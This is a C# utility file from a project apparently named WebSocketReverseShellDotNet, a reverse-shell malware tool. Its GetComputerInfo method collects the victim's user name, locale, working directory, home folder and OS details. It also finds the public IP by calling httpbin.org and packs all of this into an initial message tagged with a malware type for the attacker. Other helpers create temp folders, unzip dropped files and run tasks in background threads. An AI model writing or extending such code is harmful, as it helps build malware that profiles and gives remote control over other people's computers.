using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class OSUtil
    {
        public static ReverseShellInfoInitialMessage GetComputerInfo()
        {
            return new ReverseShellInfoInitialMessageBuilder()
                .WithUserName(Environment.UserName)
                .WithUserLanguage(System.Globalization.CultureInfo.CurrentCulture.Name)
                .WithUserCurrentWorkingDir(Environment.CurrentDirectory)
                .WithUserHome(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
                .WithOsName(System.Runtime.InteropServices.RuntimeInformation.OSDescription)
                .WithOsArch(System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString())
                .WithOsVersion(Environment.OSVersion.ToString)
                .WithUserPublicIp(GetPublicIp())
                .WithMalwareType("C#")
                .WithReply("Success") // Assuming a default reply
                .Build();
        }

        static string GetPublicIp()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = client.GetAsync("https://httpbin.org/ip").Result;

                    if (response.IsSuccessStatusCode)
                    {
                        string json = response.Content.ReadAsStringAsync().Result;

                        // Deserialize JSON response to PublicIpJsonModel
                        PublicIpJsonModel publicIpJsonModel = Newtonsoft.Json.JsonConvert.DeserializeObject<PublicIpJsonModel>(json);

                        if (publicIpJsonModel != null && publicIpJsonModel.Origin != null)
                        {
                            return publicIpJsonModel.Origin;
                        }
                        else
                        {
                            return json; // Return the raw JSON response if the deserialization fails
                        }
                    }
                    else
                    {
                        return string.Empty;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return string.Empty;
            }
        }

        public static string GetSystemTempDir()
        {
            return Path.GetTempPath();
        }


 
        public static void  RunFunctionInThreadAsync(Action myFunction)
        {
            try
            {
                // Use Task.Run to run the provided action in a separate thread
                Task.Run(() => myFunction());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception occurred in the thread: " + ex);
            }
        }


    public static void Sleep(int milliSeconds)
        {
            try
            {
                Thread.Sleep(milliSeconds);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        public static DirectoryInfo CreateDirectoryInTmpFolder(string dir)
        {
            string tmpDirectory = Path.Combine(GetSystemTempDir(), dir);
            Directory.CreateDirectory(tmpDirectory);

            return new DirectoryInfo(tmpDirectory);
        }



        // refactor later
        public static string Unzip(string zipFilePath, string destDirectory)
        {
            try
            {
                // Create the destination directory if it doesn't exist
                Directory.CreateDirectory(destDirectory);

                // Extract all entries from the ZIP file
                ZipFile.ExtractToDirectory(zipFilePath, destDirectory);
                
                // Get the extracted files
                string[] extractedFiles = Directory.GetFiles(destDirectory);

                // Check if there is exactly one file in the extracted directory
                if (extractedFiles.Length != 1)
                {
                    throw new IOException("Expected one file in the ZIP archive, found: " + extractedFiles.Length);
                }

                Console.WriteLine("Unzip completed successfully.");
                return extractedFiles[0];
            }
            catch (IOException e)
            {
                Console.Error.WriteLine("Failed to unzip the file: " + zipFilePath);
                throw e; // Rethrow the exception to indicate the failure
            }
        }










        }
}
